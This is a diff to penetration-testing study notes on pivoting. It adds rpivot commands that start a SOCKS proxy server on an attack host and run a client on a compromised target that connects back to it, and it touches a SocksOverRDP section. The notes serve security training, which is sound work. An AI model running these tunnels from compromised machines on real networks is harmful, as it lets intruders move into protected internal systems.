@@ -233,6 +233,26 @@ c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/loca
 
 With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
 
+# rpivot
+
+## Running server.py from the Attack Host
+
+```bash
+$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+```
+
+## Running client.py from Pivot Target
+
+```bash
+python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+```
+
+## Confirming Connection
+
+```shell
+New connection from host 10.129.202.64, source port 35226
+```
+
 # ICMP Tunneling with SOCKS
 
 ## Start ptunnel-ng Server on target
@@ -393,7 +413,7 @@ Connect to target machine over RDP using `mstsc.exe`, and we should receive a p
 
 We will need to transfer `SocksOverRDPx64.zip` or just the `SocksOverRDP-Server.exe` to target. We can then start SocksOverRDP-Server.exe with `Admin` privileges.
 
-When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on `127.0.0.1:1080`.
+When we go back to our foothold target and check with Netstat, we should see our `SOCKS5` listener started on `127.0.0.1:1080`.
 
 ```powershell
 C:\> netstat -antb | findstr 1080
